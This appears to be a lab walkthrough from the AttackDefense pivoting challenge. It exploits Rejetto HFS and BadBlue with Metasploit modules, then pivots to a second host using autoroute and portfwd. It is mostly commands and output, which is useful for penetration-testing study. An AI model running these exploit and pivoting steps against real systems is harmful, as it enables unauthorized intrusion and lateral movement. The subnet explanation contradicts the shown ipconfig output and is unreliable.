# ðŸ”¬Pivoting

> ðŸ”¬ [Pivoting](https://attackdefense.com/challengedetails?cid=2332)
>
> * Victim1 IP: `10.0.19.22`
> * VIctim2 IP: `10.0.24.208`
> * **Pivoting** technique with a _network route_ to the internal network's subnet

## Enumeration & Exploitation <a href="#enumeration-and-exploitation" id="enumeration-and-exploitation"></a>

```bash
ping 10.0.19.22
    PING 10.0.19.22 (10.0.19.22) 56(84) bytes of data.
    64 bytes from 10.0.19.22: icmp_seq=1 ttl=125 time=3.29 ms
    64 bytes from 10.0.19.22: icmp_seq=2 ttl=125 time=2.34 ms
ping 10.0.24.208
    PING 10.0.24.208 (10.0.24.208) 56(84) bytes of data.
# No response from Victim2
```

```bash
nmap 10.0.19.22
    PORT      STATE SERVICE
    80/tcp    open  http
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    3389/tcp  open  ms-wbt-server
    49152/tcp open  unknown
    49153/tcp open  unknown
    49154/tcp open  unknown
    49155/tcp open  unknown
```

```bash
nmap -sV -p 80 10.0.19.22
    PORT   STATE SERVICE VERSION
    80/tcp open  http    HttpFileServer httpd 2.3
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```bash
searchsploit HFS
service postgresql start && msfconsole -q
exploit/windows/http/rejetto_hfs_exec
options
set RHOSTS 10.0.19.22
exploit
```

```bash
sysinfo
    Computer        : WIN-OMCNBKR66MN
    OS              : Windows 2012 R2 (6.3 Build 9600).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 1
    Meterpreter     : x86/windows
    
getuid
    Server username: WIN-OMCNBKR66MN\Administrator
    
ipconfig
    Interface  1
    ============
    Name         : Software Loopback Interface 1
    Hardware MAC : 00:00:00:00:00:00
    MTU          : 4294967295
    IPv4 Address : 127.0.0.1
    IPv4 Netmask : 255.0.0.0
    IPv6 Address : ::1
    IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
    
    
    Interface 14
    ============
    Name         : Microsoft ISATAP Adapter
    Hardware MAC : 00:00:00:00:00:00
    MTU          : 1280
    IPv6 Address : fe80::5efe:a00:1316
    IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
    
    
    Interface 21
    ============
    Name         : Amazon Elastic Network Adapter
    Hardware MAC : 06:a3:a5:cb:d0:bf
    MTU          : 1500
    IPv4 Address : 10.0.19.22
    IPv4 Netmask : 255.255.240.0
    IPv6 Address : fe80::585e:cfc0:6c06:6201
    IPv6 Netmask : ffff:ffff:ffff:ffff::
```

* Victim2 is on the same Victim1 subnet - **`10.2.16.0/20`** (look at the Interface 12)
  * `10.2.16.0/20` = from `10.2.16.1` to `10.2.31.254` = `10.2.20.0/20`

## Pivoting <a href="#pivoting" id="pivoting"></a>

* From the attacker's machine, a route through "Victim1 `10.2.20.0/20` machine" is needed, to run MSF modules against Victim2 machine

```bash
run autoroute -h

    [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
    [!] Example: run post/multi/manage/autoroute OPTION=value [...]
    [*] Usage:   run autoroute [-r] -s subnet -n netmask
    [*] Examples:
    [*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
    [*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0
    [*]   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay
    [*]   run autoroute -p                            # Print active routing table
    [*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route
    [*] Use the "route" and "ipconfig" Meterpreter commands to learn about available routes
    [-] Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module
```

```bash
run autoroute -s 10.0.19.0/20
```

```bash
[*] Adding a route to 10.0.19.0/255.255.240.0...
[+] Added route to 10.0.19.0/255.255.240.0 via 10.0.19.22
[*] Use the -p option to list all active routes
```

```bash
run autoroute -p
```

```bash
Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.0.19.0          255.255.240.0      Session 1
```

* &#x20;Now, subnet `10.0.19.0/20` can be accessed with `MSFconsole`

```bash
background
```

* Scan for open ports on the Victim2 system - `10.0.24.208`

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.24.208
set PORTS 1-100
run
```

```bash
[+] 10.0.24.208:          - 10.0.24.208:80 - TCP OPEN
[*] 10.0.24.208:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

* ðŸ“Œ The route is only applicable to `MSFconsole`, not outside of it

## Port Forwarding <a href="#port-forwarding" id="port-forwarding"></a>

* To perform an `nmap` scan on Victim2, **a port forwarding need to be set up**.
  * **`e.g.`** forward the remote port `80` to an attacker machine local port, which will allow to perform a service version enumeration of the Victim2 service

```bash
sessions 1
```

```bash
portfwd -h
    Usage: portfwd [-h] [add | delete | list | flush] [args]
    
    
    OPTIONS:
    
        -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
        -R        Indicates a reverse port forward.
        -h        Help banner.
        -i <opt>  Index of the port forward entry to interact with (see the "list" command).
        -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
        -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
        -r <opt>  Forward: remote host to connect to.
```

```bash
portfwd add -l 1234 -p 80 -r 10.0.24.208
    [*] Local TCP relay created: :1234 <-> 10.0.24.208:80
```

```bash
portfwd list

   Active Port Forwards
   ====================
   
      Index  Local           Remote        Direction
      -----  -----           ------        ---------
      1      10.0.24.208:80  0.0.0.0:1234  Forward
   
   1 total active port forwards.
```

```bash
nmap -sV -sS -p 1234 localhost
```

<figure><img src="../../../../.gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure>

* Exploit Victim2 target machine

```bash
searchsplouit badblue
use exploit/windows/http/badblue_passthru
set payload windows/meterpreter/bind_tcp
set RHOSTS 10.0.24.208
run
```

```bash
sysinfo
    Computer        : ATTACKDEFENSE
    OS              : Windows 2016+ (10.0 Build 17763).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 1
    Meterpreter     : x86/windows
    
getuid
    Server username: ATTACKDEFENSE\Administrator
```

```bash
background
sessions
```

<figure><img src="../../../../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>
